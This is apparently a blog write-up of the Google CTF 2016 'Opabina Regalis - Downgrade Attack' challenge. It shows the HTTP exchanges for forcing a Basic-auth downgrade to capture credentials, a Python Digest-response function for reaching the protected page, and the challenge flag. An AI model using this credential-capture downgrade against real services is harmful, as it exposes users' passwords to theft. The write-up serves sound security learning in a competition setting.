---
layout: post
title: Google CTF 2016 - Opabina Regalis - Downgrade Attack
---
> Following on from Opabina Regalis - Token Fetch, this challenge listens on
> ``ssl-added-and-removed-here.ctfcompetition.com:20691``.

This challenge also uses protocol buffers. After opening a connection, we get a
request to ``/protected/not-secret``. The  idea is to send a response that asks
for HTTP Basic auth, get the password, and use that password to request
``protected/secret`` with Digest auth.

Initial request from server:

{% highlight http %}
GET /protected/not-secret HTTP/1.1
User-Agent: opabina-regalis.go
{% endhighlight %}

Our 401 response:

{% highlight http %}
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="In the realm of hackers"
{% endhighlight %}

The server will then respond with a request containing the base64 username and
password:

{% highlight http %}
GET /protected/not-secret HTTP/1.1
User-Agent: opabina-regalis.go
Authorization: Basic Z29vZ2xlLmN0ZjoxODAxMTg2MjEwLjEwMDA2NTI3NjEuOTA4OTcyODQy
{% endhighlight %}

Which decodes to ``google.ctf:1801186210.1000652761.908972842``. Note that a new
password is generated for each session.

If we make a request to ``/protected/secret``, we get a 401, specifying Digest
authorization:

{% highlight http %}
HTTP/1.1 401 Unauthorized
Server: opabina-regalis.go
WWW-Authenticate: Digest realm="In the realm of hackers",qop="auth",nonce="f2c8bb0f1b5bb7ed",opaque="f2c8bb0f1b5bb7ed"
{% endhighlight %}

Since we have the password, nonce, realm, and opaque parameters, we can now
compute the digest response:

{% highlight python %}
def calc_response(username, realm, password, method, uri, nonce, nc, cnonce):
    ha1 = hashlib.md5(':'.join((username, realm, password))).hexdigest()
    ha2 = hashlib.md5(':'.join((method, uri))).hexdigest()
    r = hashlib.md5(':'.join((ha1, nonce, nc, cnonce, 'auth', ha2))).hexdigest()
    return r
{% endhighlight %}

And we can build the header and send it with our request:

{% highlight http %}
GET /protected/secret HTTP/1.1
Authorization: Digest username="google.ctf",realm="In the realm of hackers",nonce="af8a6a5f1c64ade3",uri="/protected/secret",qop=auth,nc=00000001,cnonce="1115fd1d40a5b9d5",response="ec0555e97853f8e14b2b8cae23208d7b",opaque="af8a6a5f1c64ade3"
{% endhighlight %}

Bingo!

{% highlight http %}
HTTP/1.1 200 OK
Server: opabina-regalis.go

CTF{What:is:green:and:goes:to:summer:camp...A:brussel:scout}
{% endhighlight %}
